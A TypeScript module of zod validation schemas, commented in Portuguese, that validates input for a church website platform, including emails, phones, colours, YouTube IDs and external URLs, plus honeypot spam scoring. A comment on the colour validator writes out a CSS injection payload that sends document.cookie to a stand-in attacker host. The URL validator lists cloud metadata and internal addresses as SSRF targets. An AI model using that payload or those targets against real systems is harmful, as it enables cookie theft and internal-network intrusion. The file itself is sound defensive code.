import { z } from "zod";

/**
 * Blocos de validação reutilizáveis.
 *
 * PRINCÍPIO: allowlist, não denylist.
 * Não tentamos listar o que é perigoso (`<script>`, `' OR 1=1`, `../`) — essa
 * lista nunca fica completa e sempre tem um encoding que escapa. Descrevemos o
 * que é VÁLIDO e recusamos o resto. Um telefone brasileiro tem 10 ou 11
 * dígitos; qualquer coisa fora disso é rejeitada, sem precisar saber por quê.
 *
 * Isto roda SEMPRE no servidor. Validação no navegador é conveniência para o
 * usuário, nunca controle de segurança: o atacante não usa o seu formulário.
 */

/** Remove caracteres de controle e normaliza espaços. Não "sanitiza" HTML:
 *  o escape acontece na renderização, que é onde o contexto é conhecido. */
export const textoLimpo = (max: number, min = 1) =>
  z
    .string()
    .transform((v) =>
      v
        // Remove caracteres de controle (inclui \0, que quebra strings em C
        // e já causou bypass de validação em várias bibliotecas).
        .replace(/[\u0000-\u001F\u007F]/g, "")
        .replace(/\s+/g, " ")
        .trim(),
    )
    .pipe(z.string().min(min).max(max));

/** Texto longo: preserva quebras de linha, remove o resto dos controles. */
export const textoLongo = (max: number, min = 1) =>
  z
    .string()
    .transform((v) =>
      v
        .replace(/[\u0000-\u001F\u007F]/g, "")
        .replace(/\r\n/g, "\n")
        .replace(/\n{4,}/g, "\n\n\n")
        .trim(),
    )
    .pipe(z.string().min(min).max(max));

export const email = z
  .string()
  .trim()
  .toLowerCase()
  .max(254) // RFC 5321
  .email("E-mail inválido.")
  // Um "e-mail" com 200 caracteres antes do @ é sinal de payload, não de
  // pessoa. Também evita estourar colunas em integrações futuras.
  .refine((v) => (v.split("@")[0]?.length ?? 0) <= 64, "E-mail inválido.");

export const emailOpcional = z
  .union([email, z.literal("")])
  .optional()
  .transform((v) => (v === "" ? undefined : v));

/**
 * Telefone brasileiro. Guardamos só os dígitos: normalizar na entrada evita
 * que "(51) 99999-9999" e "51999999999" virem duas pessoas diferentes na base.
 */
export const telefone = z
  .string()
  .trim()
  .transform((v) => v.replace(/\D/g, ""))
  .pipe(
    z
      .string()
      .min(10, "Telefone deve ter DDD + número.")
      .max(13, "Telefone inválido.")
      .regex(/^\d+$/, "Telefone inválido."),
  );

export const telefoneOpcional = z
  .union([telefone, z.literal("")])
  .optional()
  .transform((v) => (v === "" ? undefined : v));

export const nomePessoa = textoLimpo(160, 2).refine(
  // Nome com dígito ou URL é quase sempre spam de bot.
  (v) => !/\d{3,}|https?:|www\.|@.*\./i.test(v),
  "Informe um nome válido.",
);

export const cep = z
  .string()
  .trim()
  .transform((v) => v.replace(/\D/g, ""))
  .pipe(z.string().length(8, "CEP inválido."))
  .optional();

export const uf = z
  .string()
  .trim()
  .toUpperCase()
  .length(2)
  .regex(/^(AC|AL|AP|AM|BA|CE|DF|ES|GO|MA|MT|MS|MG|PA|PB|PR|PE|PI|RJ|RN|RS|RO|RR|SC|SP|SE|TO)$/, "UF inválida.")
  .optional();

/** CUID do Prisma. Valida o FORMATO antes de o valor tocar o banco. */
export const id = z
  .string()
  .regex(/^c[a-z0-9]{20,30}$/, "Identificador inválido.");

export const idOpcional = z
  .union([id, z.literal("")])
  .optional()
  .transform((v) => (v === "" ? undefined : v));

/**
 * Cor hexadecimal.
 *
 * ESTA VALIDAÇÃO É CONTROLE DE SEGURANÇA, NÃO FORMATAÇÃO.
 * A cor vai virar uma custom property CSS injetada num `<style>`. Sem esta
 * regex, um admin de igreja poderia salvar a cor
 *   `#fff; } body { background: url('https://atacante/?c='+document.cookie)`
 * e escapar do valor da propriedade para dentro da folha de estilo.
 * A âncora `^...$` é o que impede a fuga.
 */
export const corHex = z
  .string()
  .trim()
  .regex(/^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/, "Use uma cor no formato #RRGGBB.");

/**
 * ID de vídeo do YouTube — 11 caracteres do alfabeto base64url.
 *
 * Aceitamos também a URL colada pelo usuário, mas EXTRAÍMOS o ID e
 * descartamos o resto. O `src` do iframe é montado por nós a partir do ID,
 * então não existe caminho para o usuário controlar a URL do frame
 * (que seria um vetor direto de XSS via `javascript:` ou de embed hostil).
 */
export const youtubeVideoId = z
  .string()
  .trim()
  .transform((v) => {
    const direto = /^[A-Za-z0-9_-]{11}$/;
    if (direto.test(v)) return v;

    const padroes = [
      /(?:youtube\.com\/watch\?[^#]*\bv=)([A-Za-z0-9_-]{11})/,
      /(?:youtu\.be\/)([A-Za-z0-9_-]{11})/,
      /(?:youtube\.com\/embed\/)([A-Za-z0-9_-]{11})/,
      /(?:youtube\.com\/live\/)([A-Za-z0-9_-]{11})/,
      /(?:youtube\.com\/shorts\/)([A-Za-z0-9_-]{11})/,
    ];
    for (const p of padroes) {
      const m = v.match(p);
      if (m?.[1]) return m[1];
    }
    return v; // cai na validação abaixo e é rejeitado
  })
  .pipe(z.string().regex(/^[A-Za-z0-9_-]{11}$/, "Informe um link ou ID de vídeo válido do YouTube."));

export const youtubeChannelId = z
  .string()
  .trim()
  .regex(/^UC[A-Za-z0-9_-]{22}$/, "O ID do canal começa com UC e tem 24 caracteres.");

/**
 * URL externa. Só http(s), e nunca endereços internos.
 *
 * O bloqueio de host interno é defesa contra SSRF: sem ele, um admin poderia
 * salvar `http://169.254.169.254/latest/meta-data/` (metadados de nuvem) ou
 * `http://localhost:5432` e usar o servidor como proxy para a rede interna.
 */
export const urlExterna = z
  .string()
  .trim()
  .url("Endereço inválido.")
  .max(500)
  .refine((v) => {
    let u: URL;
    try {
      u = new URL(v);
    } catch {
      return false;
    }
    if (u.protocol !== "https:" && u.protocol !== "http:") return false;

    const host = u.hostname.toLowerCase();
    const bloqueados = [
      "localhost", "127.0.0.1", "0.0.0.0", "::1",
      "169.254.169.254",        // metadados de instância (AWS/GCP/Azure)
      "metadata.google.internal",
    ];
    if (bloqueados.includes(host)) return false;

    // Faixas privadas RFC 1918 e link-local.
    if (/^10\./.test(host)) return false;
    if (/^192\.168\./.test(host)) return false;
    if (/^172\.(1[6-9]|2\d|3[01])\./.test(host)) return false;
    if (/^169\.254\./.test(host)) return false;
    if (host.endsWith(".local") || host.endsWith(".internal")) return false;

    return true;
  }, "Endereço não permitido.");

export const urlOpcional = z
  .union([urlExterna, z.literal("")])
  .optional()
  .transform((v) => (v === "" ? undefined : v));

/** Slug para URL: minúsculas, dígitos e hífen. */
export const slug = z
  .string()
  .trim()
  .toLowerCase()
  .min(2)
  .max(80)
  .regex(/^[a-z0-9]+(?:-[a-z0-9]+)*$/, "Use apenas letras minúsculas, números e hífen.");

/** Hostname para vincular domínio de cliente. */
export const hostname = z
  .string()
  .trim()
  .toLowerCase()
  .max(253)
  .transform((v) => v.replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/\.$/, ""))
  .pipe(
    z
      .string()
      .regex(
        /^(?!-)[a-z0-9-]{1,63}(?<!-)(\.(?!-)[a-z0-9-]{1,63}(?<!-))+$/,
        "Informe um domínio válido, como igreja.com.br",
      ),
  );

export const dataISO = z
  .string()
  .trim()
  .regex(/^\d{4}-\d{2}-\d{2}$/, "Use o formato AAAA-MM-DD.")
  .refine((v) => !Number.isNaN(Date.parse(v)), "Data inválida.");

export const dataOpcional = z
  .union([dataISO, z.literal("")])
  .optional()
  .transform((v) => (v === "" ? undefined : v));

export const horario = z
  .string()
  .trim()
  .regex(/^([01]\d|2[0-3]):([0-5]\d)$/, "Use o formato HH:MM.");

export const diaSemana = z.coerce.number().int().min(0).max(6);

/** Paginação com TETO obrigatório.
 *  Sem o `.max(100)`, um `?limite=1000000` viraria DoS de memória e de banco. */
export const paginacao = z.object({
  pagina: z.coerce.number().int().min(1).max(10_000).default(1),
  limite: z.coerce.number().int().min(1).max(100).default(25),
});

/**
 * Termo de busca.
 * Vai para `contains` do Prisma, que é parametrizado — não há injeção de SQL.
 * O limite de tamanho existe por performance: um LIKE com termo gigante em
 * tabela grande é caro, e alguém pode fazer isso de propósito.
 */
export const termoBusca = z
  .string()
  .trim()
  .max(80)
  .transform((v) => v.replace(/[\u0000-\u001F\u007F]/g, ""))
  .optional();

export const consentimentoObrigatorio = z
  .union([z.boolean(), z.literal("on"), z.literal("true"), z.literal("1")])
  .transform((v) => v === true || v === "on" || v === "true" || v === "1")
  .refine((v) => v === true, "É necessário aceitar o tratamento dos seus dados.");

/**
 * Campos anti-spam presentes em todo formulário público.
 *
 * `website` é um honeypot: um input escondido por CSS. Pessoa nenhuma
 * preenche; bot que varre o DOM preenche quase sempre.
 *
 * `_t` é o instante em que o formulário foi renderizado. Um humano leva
 * pelo menos alguns segundos para preencher; envio em 300ms é robô.
 */
export const antiSpam = z.object({
  website: z.string().max(0, "Requisição inválida.").optional().default(""),
  _t: z.coerce.number().int().optional(),
});

/** Pontua o quanto uma submissão parece automatizada (0 = humano). */
export function pontuarSpam(dados: {
  website?: string;
  _t?: number;
  texto?: string;
}): number {
  let score = 0;

  if (dados.website && dados.website.length > 0) score += 100;

  if (typeof dados._t === "number" && dados._t > 0) {
    const decorridoMs = Date.now() - dados._t;
    if (decorridoMs < 2_000) score += 60;          // rápido demais
    else if (decorridoMs < 4_000) score += 25;
    if (decorridoMs > 6 * 60 * 60 * 1000) score += 20; // formulário de ontem
  }

  if (dados.texto) {
    const t = dados.texto;
    const links = (t.match(/https?:\/\//gi) ?? []).length;
    if (links >= 1) score += 25;
    if (links >= 3) score += 40;
    if (/\[url=|<a\s+href|\bviagra\b|\bcasino\b|\bcrypto\s*invest/i.test(t)) score += 50;
    // Texto sem espaço nenhum e muito longo é payload, não desabafo.
    if (t.length > 200 && !t.includes(" ")) score += 40;
  }

  return score;
}

/** A partir daqui a submissão entra como SPAM e não notifica ninguém. */
export const LIMIAR_SPAM = 60;
